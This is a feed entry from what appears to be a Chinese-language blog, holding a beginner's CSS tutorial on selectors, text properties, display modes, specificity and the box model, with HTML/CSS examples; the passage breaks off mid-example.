  <entry>
    <title>CSS</title>
    <link href="/2022/12/29/CSS/"/>
    <url>/2022/12/29/CSS/</url>
    
    <content type="html"><![CDATA[<h1>CSS</h1><h2 id="CSS简介">CSS简介</h2><p>CSS时层叠样式表( Cascading Style Sheets )的简称.</p><p>CSS也是一种标记语言</p><p><strong>CSS 规则由两个主要的部分构成：选择器以及一条或多条声明。</strong></p><ul class="lvl-0"><li class="lvl-2"><p>选择器是用于指定 CSS 样式的 HTML 标签，花括号内是对该对象设置的具体样式</p></li><li class="lvl-2"><p>属性和属性值以“键值对”的形式出现</p></li><li class="lvl-2"><p>属性是对指定的对象设置的样式属性，例如字体大小、文本颜色等</p></li><li class="lvl-2"><p>属性和属性值之间用英文“<strong>:</strong>”分开</p></li><li class="lvl-2"><p>多个“键值对”之间用英文“<strong>;</strong>”进行区</p></li></ul><p>所有的样式，都包含在 &lt;style&gt; 标签内，表示是样式表。&lt;style&gt; 一般写到 &lt;/head&gt; 上方。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"> </span><br><span class="language-css">    <span class="hljs-selector-tag">h4</span> &#123; </span><br><span class="language-css">      <span class="hljs-attribute">color</span>: blue; </span><br><span class="language-css">      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">100px</span>; </span><br><span class="language-css">    &#125; </span><br><span class="language-css">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span> <br>&lt;/head<br></code></pre></td></tr></table></figure><h2 id="基础选择器">基础选择器</h2><h3 id="标签选择器">标签选择器</h3><p>把某一类标签全部选择出来，能快速为页面中同类型的标签统一设置样式。 不能设计差异化样式，只能选择全部的当前标签</p><blockquote><p>标签名{<br>属性1: 属性值1;<br>属性2: 属性值2;<br>属性3: 属性值3;<br>…<br>}</p></blockquote><blockquote><p>h1 {<br>属性1: 属性值;<br>属性2: 属性值;<br>…<br>}</p></blockquote><h3 id="类选择器">类选择器</h3><blockquote><p>.类名 {<br>属性1: 属性值;<br>属性2: 属性值;<br>…<br>}</p></blockquote><blockquote><p>&lt;div class=“red”&gt;类选择器红色&lt;/div&gt;</p><p>.red {</p><p>​color: red;</p><p>}</p></blockquote><p>多类名时,各个类名之间用&quot;<strong>,</strong>&quot;隔开</p><h3 id="id选择器">id选择器</h3><blockquote><p>#id名 {</p><p>​属性1: 属性值1;</p><p>​…<br>}</p></blockquote><blockquote><p>&lt;div id=“red”&gt;id选择id器红色&lt;/div&gt;</p><p>#red {</p><p>​color: red;</p><p>}</p></blockquote><p><font color="red">注: id不可重复, 具有唯一性</font></p><h3 id="通配符选择器">通配符选择器</h3><p>通配符选择器使用“*****”定义，它表示选取页面中所有元素（标签）。</p><blockquote><p>* {</p><p>​属性1: 属性值1;</p><p>​…</p><p>}</p></blockquote><h3 id="总结">总结</h3><table><thead><tr><th>基础选择器</th><th>作用</th><th>特点</th><th>使用情况</th><th>用法</th></tr></thead><tbody><tr><td>标签选择器</td><td>可以选出所有相同标签,比如p</td><td>不能差异化选择</td><td>较多</td><td>p { color: re; }</td></tr><tr><td>类选择器</td><td>可以选出一个或多个标签</td><td>根据需求选择</td><td>非常多</td><td>.nav { color: red; }</td></tr><tr><td>id选择器</td><td>一次只能选择一个标签</td><td>ID属性只能在每个html文档中出现一次</td><td>一般和js搭配</td><td>#nav { color: red; }</td></tr><tr><td>通配符选择器</td><td>选择所有标签</td><td>选择太多,有部分不需要</td><td>特殊情况使用</td><td>* { color: red; }</td></tr></tbody></table><h2 id="字体属性">字体属性</h2><table><thead><tr><th>属性</th><th>表示</th><th>注意点</th></tr></thead><tbody><tr><td>font-size</td><td>字号</td><td>单位px像素，一定要跟上单位</td></tr><tr><td>font-family</td><td>字体</td><td>字体名</td></tr><tr><td>font-weight</td><td>字体粗细</td><td>加粗：700或bold，不加粗：normal或400，无单位</td></tr><tr><td>font-style</td><td>字体样式</td><td>倾斜：italic，不倾斜：normal</td></tr><tr><td>font</td><td>字体连写</td><td>1.顺序 2.字号和字体必须同时出现</td></tr></tbody></table><h2 id="文本属性">文本属性</h2><table><thead><tr><th>属性</th><th>表示</th><th>注意点</th></tr></thead><tbody><tr><td>color</td><td>文本颜色</td><td>通常用十六进制表示</td></tr><tr><td>text-align</td><td>文本对齐</td><td>left：左对齐；right：右对齐；center：居中</td></tr><tr><td>text-indent</td><td>文本缩进</td><td>首行缩进2个字的距离 text-indent：2em；</td></tr><tr><td>text-decoration</td><td>文本装饰</td><td>none：没有装饰线；underline：下划线；overline：上划线；line-through：删除线</td></tr><tr><td>line-hight</td><td>行高</td><td>控制行与行之间的距离</td></tr></tbody></table><p><img src="/2022/12/29/CSS/image-20200726095714226.png" alt="image-20200726095714226"></p><h2 id="引入方式">引入方式</h2><h3 id="行内样式表">行内样式表</h3><p>行内样式表（内联样式表）是在元素标签内部的 style 属性中设定 CSS 样式。适合于修改简单样式.</p><blockquote><p>&lt;div style=“color: red; font-size: 12px;”&gt;青春不常在，抓紧谈恋爱&lt;/div&gt;</p></blockquote><h3 id="内部样式表">内部样式表</h3><p>内部样式表（内嵌样式表）是写到html页面内部. 是将所有的 CSS 代码抽取出来，单独放到一个 &lt;style&gt; 标签中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"> </span><br><span class="language-css">   <span class="hljs-selector-tag">div</span> &#123; </span><br><span class="language-css">     <span class="hljs-attribute">color</span>: red; </span><br><span class="language-css">     <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>; </span><br><span class="language-css">   &#125; </span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="外部样">外部样</h3><p>实际开发都是外部样式表. 适合于样式比较多的情况. 核心是:样式单独写到CSS 文件中，之后把CSS文件引入 到 HTML 页面中使用</p><p>引入外部样式表分为两步：</p><ol><li class="lvl-3"><p>新建一个后缀名为 .css 的样式文件，把所有 CSS 代码都放入此文件中。</p></li><li class="lvl-3"><p>在 HTML 页面中，使用&lt;link&gt; 标签引入这个文件。</p></li></ol><blockquote><p>&lt;link rel=“stylesheet”  href=“css文件路径”&gt;</p></blockquote><h3 id="总结-2">总结</h3><table><thead><tr><th>样式表</th><th>优点</th><th>缺点</th><th>使用情况</th><th>控制范围</th></tr></thead><tbody><tr><td>行内样式表</td><td>书写方便，权重高</td><td>结构样式混写</td><td>较少</td><td>控制一个标签</td></tr><tr><td>内部样式表</td><td>部分结构和样式相分离</td><td>没有彻底分离</td><td>较多</td><td>控制一个页面</td></tr><tr><td>外部样式表</td><td>完全实现结构和样式相分离</td><td>需要引入 最多，</td><td>吐血推荐</td><td>控制多个页面</td></tr></tbody></table><h2 id="复合选择器">复合选择器</h2><h3 id="后代选择器">后代选择器</h3><blockquote><p>元素1 元素2 {样式声明}</p><p>ul li {样式声明}/*选择ul里面所有的li标签元素*/</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>元素1 和 元素2 中间用<strong>空格隔开</strong></p></li><li class="lvl-3"><p>元素1 是父级，元素2 是子级，最终选择的是**元素2 **</p></li><li class="lvl-2"><p>元素2 可以是儿子，也可以是孙子等，只要是元素1 的后代即可</p></li><li class="lvl-2"><p>元素1 和 元素2 可以是任意基础选择器</p></li></ul><h3 id="子选择器">子选择器</h3><p>选择某元素的最近一级子元素。就是亲儿子元素</p><blockquote><p>元素1 &gt; 元素2 {样式声明}</p><p>div &gt; p {样式声明}/*选择div里面所有最近一级p标签元素*/</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>元素1 和 元素2 中间用 <strong>大于号</strong> 隔开</p></li><li class="lvl-2"><p>元素1 是父级，元素2 是子级，<strong>最终选择的是元素2</strong></p></li><li class="lvl-2"><p>元素2 必须是<strong>亲儿子</strong>，其孙子、重孙之类都不归他管. 你也可以叫他 亲儿子选择器</p></li></ul><h3 id="并集选择器">并集选择器</h3><p>并集选择器可以选择多组标签, 同时为他们定义相同的样式。通常用于集体声明.<br><strong>并集选择器</strong>是各选择器<strong>通过英文逗号（,）连接而成</strong>，任何形式的选择器都可以作为并集选择器的一部分。</p><blockquote><p>元素1， 元素2 {样式声明}</p><p>ul，div {样式声明}/*选择ul和div标签元素*/</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>元素1 和 元素2 中间用逗号隔开</p></li><li class="lvl-2"><p>逗号可以理解为和的意思</p></li><li class="lvl-2"><p>并集选择器通常用于集体声明</p></li></ul><h3 id="伪类选择器">伪类选择器</h3><p>伪类选择器用于向某些选择器添加特殊的效果，比如给链接添加特殊效果，或选择第1个，第n个元素。</p><h4 id="链接伪类">链接伪类</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">a:link &#123;color:#FF0000;&#125; /* 未访问的链接 */<br>a:visited &#123;color:#00FF00;&#125; /* 已访问的链接 */<br>a:hover &#123;color:#FF00FF;&#125; /* 鼠标划过链接 */<br>a:active &#123;color:#0000FF;&#125; /* 已选中的链接 */<br></code></pre></td></tr></table></figure><h4 id="focus伪类选择器">focus伪类选择器</h4><p><strong>:focus</strong> 伪类选择器用于选取获得焦点的表单元素。焦点就是光标，一般情况 &lt;input&gt; 类表单元素才能获取，因此这个选择器也主要针对于表单元素来说</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">input:focus &#123;  <br>   background-color:yellow; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结-3">总结</h3><table><thead><tr><th>选择器</th><th>作用</th><th>特征</th><th>使用情况</th><th>隔开符号及用法</th></tr></thead><tbody><tr><td>后代选择器</td><td>用来选择后代元素</td><td>可以是子孙后代</td><td>较多</td><td>符号是空格 .nav a</td></tr><tr><td>子代选择器</td><td>选择最近一级元素</td><td>只选亲儿子</td><td>较少</td><td>符号是大于 .nav&gt;p</td></tr><tr><td>并集选择器</td><td>选择某些相同样式的元素</td><td>可以用于集体声明</td><td>较多</td><td>符号是逗号 .nav, header</td></tr><tr><td>链接伪类选择器</td><td>选择不同状态的链接</td><td>跟链接相关</td><td>较多</td><td>重点记住a{} 和 a:hover实际开发的写法</td></tr><tr><td>:focus选择器</td><td>选择获得光标的表单</td><td>跟表单相关</td><td>较少</td><td>input:focus 记住这个写法</td></tr></tbody></table><h2 id="元素的显示模式">元素的显示模式</h2><h3 id="快元素">快元素</h3><p>常见的块元素有&lt;h1&gt;~&lt;h6&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;等，其中 &lt;div&gt; 标签是<strong>最典型的块元素。</strong></p><p><strong>特点</strong></p><ol><li class="lvl-3"><p>独占一行</p></li><li class="lvl-3"><p>高度， 宽度，外边距以及内边距</p></li><li class="lvl-3"><p>宽度默认容器的100%</p></li><li class="lvl-3"><p>是一个容器及盒子</p></li></ol><p><strong>注意：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>文字类的元素内不能使用块级元素</p></li><li class="lvl-2"><p>&lt;p&gt; 标签主要用于存放文字，因此 &lt;p&gt; 里面不能放块级元素，特别是不能放&lt;div&gt;</p></li><li class="lvl-2"><p>同理， &lt;h1&gt;~&lt;h6&gt;等都是文字类块级标签，里面也不能放其他块级元素</p></li></ul><h3 id="行元素">行元素</h3><p>常见的行内元素有 &lt;a&gt;、&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;、&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;span&gt;等，其中 &lt;span&gt; 标签是最典型的行内元素。有的地方也将行内元素称为内联元素。<br>2.2 行内元素<br>**行内元素的特点： **</p><ol><li class="lvl-3"><p>相邻行内元素在一行上，一行可以显示多个。</p></li><li class="lvl-3"><p>高、宽直接设置是无效的。</p></li><li class="lvl-3"><p>默认宽度就是它本身内容的宽度。</p></li><li class="lvl-3"><p>行内元素只能容纳文本或其他行内元素。</p></li></ol><p>注意：</p><ul class="lvl-0"><li class="lvl-2"><p>文字类的元素内不能使用块级元素</p></li><li class="lvl-2"><p>&lt;p&gt; 标签主要用于存放文字，因此 &lt;p&gt; 里面不能放块级元素，特别是不能放&lt;div&gt;</p></li><li class="lvl-2"><p>同理， &lt;h1&gt;~&lt;h6&gt;等都是文字类块级标签，里面也不能放其他块级元素</p></li></ul><h3 id="行内快元素">行内快元素</h3><p>在行内元素中有几个特殊的标签 —— &lt;img /&gt;、&lt;input /&gt;、&lt;td&gt;，它们同时具有块元素和行内元素的特点。 有些资料称它们为行内块元素。</p><p>行内块元素的特点：</p><ul class="lvl-0"><li class="lvl-2"><p>和相邻行内元素（行内块）在一行上，但是他们之间会有空白缝隙。一行可以显示多个（行内元素特点）。</p></li><li class="lvl-2"><p>默认宽度就是它本身内容的宽度（行内元素特点）。</p></li><li class="lvl-2"><p>高度，行高、外边距以及内边距都可以控制（块级元素特点）</p></li></ul><h3 id="总结-4">总结</h3><table><thead><tr><th>元素模式</th><th>元素排列</th><th>设置样式</th><th>默认宽度</th><th>包含</th></tr></thead><tbody><tr><td>块级元素</td><td>一行只能放一个块级元素</td><td>可以设置宽度高度</td><td>容器的100%</td><td>容器级可以包含任何标签</td></tr><tr><td>行内元素</td><td>一行可以放多个行内元素</td><td>不可以直接设置宽度 高度</td><td>它本身内容的宽度</td><td>容纳文本或则其他行内元素</td></tr><tr><td>行内快元素</td><td>一 行放多个行内块元素</td><td>可以设置宽度和高度</td><td>它本身内容的宽度</td><td></td></tr></tbody></table><h3 id="元素显示模式转换">元素显示模式转换</h3><p>元素显示转换还是很常用的，尤其是a标签的时候，虽然a标签可以嵌制div，转成快简单方便安全</p><ul class="lvl-0"><li class="lvl-2"><p><strong>转换为块元素：display:block;</strong></p></li><li class="lvl-2"><p>转换为行内元素：display:inline;</p></li><li class="lvl-2"><p><strong>转换为行内块：display: inline-block;</strong></p></li></ul><h3 id="案例">案例</h3><p><strong>小米侧边栏案例</strong></p><p>这里用的文字垂直居中非常巧妙，<strong><font color="red">盒子高度为40，设置行高为40，行高等于盒子高度。行高的上空隙和下空隙把文字挤到中间了.  是如果行高小于盒子高度,文字会偏上,如果行高大于盒子高度,则文字偏下 </font></strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>简单版小米侧边栏<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-comment">/* 1. 把a转换为块级元素 */</span></span><br><span class="language-css">        <span class="hljs-selector-tag">a</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">230px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#55585a</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">            <span class="hljs-attribute">text-decoration</span>: none;</span><br><span class="language-css">            <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;</span><br><span class="language-css">            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-comment">/* 2 鼠标经过链接变换背景颜色 */</span></span><br><span class="language-css">        <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff6700</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>手机 电话卡<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>电视 盒子<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>笔记本 平板<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>出行 穿戴<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>智能 路由器<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>健康 儿童<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>耳机 音响<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="背景">背景</h2><table><thead><tr><th>属性</th><th>作用</th><th>值</th></tr></thead><tbody><tr><td>background-color</td><td>背景颜色</td><td>预定颜色值；十六进制；RGB</td></tr><tr><td>backgroud-image</td><td>背景图片</td><td>url(图片路径)，【写法】</td></tr><tr><td>background-repeat</td><td>是否平铺</td><td>repeat/no-repeat/repeat-x/repeat-y，默认，不，横向，纵向</td></tr><tr><td>background-position</td><td>背景位置</td><td>top | center | bottom | left | center | right | x，y坐标</td></tr><tr><td>background-attachment</td><td>背景附着</td><td>scroll（背景滚动）|fixed（背景固定）</td></tr><tr><td>背景简写</td><td>书写简单</td><td>背景颜色 图片地址 平铺 滚动 位置；</td></tr><tr><td>背景半透明</td><td>背景透明</td><td>background: rgba(0,0,0,0.3);     后面必须4个值，最后一值（0-1）</td></tr></tbody></table><h2 id="三大特征">三大特征</h2><p><strong>CSS 有三个非常重要的三个特性：层叠性、继承性、优先级。</strong></p><h3 id="层叠性">层叠性</h3><p>相同选择器给设置相同的样式，此时一个样式就会覆盖（层叠）另一个冲突的样式。层叠性主要解决样式冲突 的问题 层叠性原则：</p><ul class="lvl-0"><li class="lvl-2"><p>样式冲突，遵循的原则是就<strong>近原则</strong>，哪个样式离结构近，就执行哪个样式</p></li><li class="lvl-2"><p>样式不冲突，不会层叠</p></li></ul><p>CSS 层叠性口诀：<font color="red">长江后浪推前浪，前浪死在沙滩上。 </font></p><h3 id="继承性">继承性</h3><p>CSS中的继承: 子标签会继承父标签的某些样式，如文本颜色和字号。简单的理解就是：子承父业。</p><p><img src="/2022/12/29/CSS/image-20200728104402441.png" alt="image-20200728104402441"></p><ul class="lvl-0"><li class="lvl-2"><p>恰当地使用继承可以简化代码，降低 CSS 样式的复杂性</p></li><li class="lvl-2"><p>子元素可以继承父元素的样式（text-，font-，line-这些元素开头的可以继承，以及color属性）</p></li><li class="lvl-2"><p>继承性口诀：龙生龙，凤生凤，老鼠生的孩子会打洞</p></li></ul><p><strong>行高继承</strong></p><blockquote><p>body {<br>font:12px/1.5 Microsoft YaHei；<br>}</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>行高可以跟单位也可以不跟单位</p></li><li class="lvl-2"><p>如果子元素没有设置行高，则会继承父元素的行高为 1.5</p></li><li class="lvl-2"><p>此时子元素的行高是：当前子元素的文字大小 * 1.5</p></li><li class="lvl-2"><p>body 行高 1.5  这样写法最大的优势就是里面子元素可以根据自己文字大小自动调整行高</p></li></ul><h3 id="优先级">优先级</h3><p><img src="/2022/12/29/CSS/image-20200728104741775.png" alt="image-20200728104741775"></p><ol><li class="lvl-3"><p>权重是有4组数字组成,但是不会有进位。</p></li><li class="lvl-3"><p>可以理解为类选择器永远大于元素选择器, id选择器永远大于类选择器,以此类推…</p></li><li class="lvl-3"><p>等级判断从左向右，如果某一位数值相同，则判断下一位数值。</p></li><li class="lvl-3"><p>可以简单记忆法:  通配符和继承权重为0, 标签选择器为1,类(伪类)选择器为 10, id选择器 100, 行内样式表为 1000, !important 无穷大.</p></li><li class="lvl-3"><p>继承的权重是0， 如果该元素没有直接选中，不管父元素权重多高，子元素得到的权重都是 0。</p></li></ol><p><strong>权重叠加：如果是复合选择器，则会有权重叠加，需要计算权重。</strong></p><ul class="lvl-0"><li class="lvl-2"><p>div ul  li   ------&gt;      0,0,0,3</p></li><li class="lvl-2"><p>.nav ul li   ------&gt;      0,0,1,2</p></li><li class="lvl-2"><p>a:hover      -----—&gt;   0,0,1,1</p></li><li class="lvl-2"><p>.nav a       ------&gt;      0,0,1,1</p></li></ul><h2 id="注释">注释</h2><p>注释用于解释代码，它们会被浏览器忽略。CSS 中的注释以“ <strong>/</strong>* ”开头，以“ *<strong>/</strong>  ”结尾。</p><blockquote><p>/*需要注释内容*/</p></blockquote><h2 id="盒子模型">盒子模型</h2><p><strong>页面都是由一个一个的盒子组成的，盒子就是块级元素标签</strong></p><p><img src="/2022/12/29/CSS/image-20200728112351655.png" alt="image-20200728112351655"></p><p><strong>CSS 盒子模型本质上是一个盒子，封装周围的 HTML 元素，它包括：边框、外边距、内边距、和 实际内容</strong></p><p><img src="/2022/12/29/CSS/image-20200728112739911.png" alt="image-20200728112739911"></p><img src="/2022/12/29/CSS/image-20200728112840011.png" alt="image-20200728112840011" style="zoom:80%;"><h3 id="边框">边框</h3><p>border可以设置元素的边框。边框有三部分组成:边框宽度(粗细) 边框样式  边框颜色</p><blockquote><p>border : border-width || border-style || border-color</p></blockquote><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>border-width</td><td>定义边框粗细，单位px</td></tr><tr><td>border-style</td><td>边框样式</td></tr><tr><td>birder-color</td><td>边框颜色</td></tr></tbody></table><p>边框样式 border-style 可以设置如下值：</p><ul class="lvl-0"><li class="lvl-2"><p>none：没有边框即忽略所有边框的宽度（默认值）</p></li><li class="lvl-2"><p>solid：边框为单实线(最为常用的)</p></li><li class="lvl-2"><p>dashed：边框为虚线</p></li><li class="lvl-2"><p>dotted：边框为点线</p></li></ul><p><strong>简写</strong></p><blockquote><p>border：1px solid red；没有顺序</p></blockquote><p><strong>边框分开写</strong></p><blockquote><p>border-top: 1px solid red;  /* 只设定上边框， 其余同理 */</p></blockquote><p><strong>边框粗细</strong></p><blockquote><p>border-collapse:collapse;</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>collapse 单词是合并的意思</p></li><li class="lvl-2"><p>border-collapse: collapse; 表示相邻边框合并在一起</p></li></ul><p><font color="red"><strong>注：边框会影响盒子的实际大小</strong></font></p><h3 id="内边距">内边距</h3><p><strong>padding</strong> 属性用于设置内边距，即边框与内容之间的距离</p><p><img src="/2022/12/29/CSS/image-20200728143919671.png" alt="image-20200728143919671"></p><p><strong>padding</strong> 属性（简写属性）可以有一到四个值。</p><p><img src="/2022/12/29/CSS/image-20200728144204346.png" alt="image-20200728144204346"></p><p><strong>当我们给盒子指定 padding 值之后，发生了 2 件事情：</strong></p><ol><li class="lvl-3"><p><strong>内容和边框有了距离，添加了内边距。</strong></p></li><li class="lvl-3"><p><strong>padding影响了盒子实际大小。</strong><br><strong>也就是说，如果盒子已经有了宽度和高度，此时再指定内边框，会撑大盒子。</strong></p></li></ol><p><font color="red"><strong>注：不定义盒子的宽度，加内边距不会撑大盒子</strong></font></p><h3 id="案例-2">案例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>新浪导航<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.nav</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">41px</span>;</span><br><span class="language-css"><span class="hljs-attribute">border-top</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#ff8500</span>;</span><br><span class="language-css"><span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#edeef0</span>;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fcfcfc</span>;</span><br><span class="language-css"><span class="hljs-attribute">line-height</span>: <span class="hljs-number">41px</span>;</span><br><span class="language-css"></span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">a</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">41px</span>;</span><br><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;</span><br><span class="language-css"><span 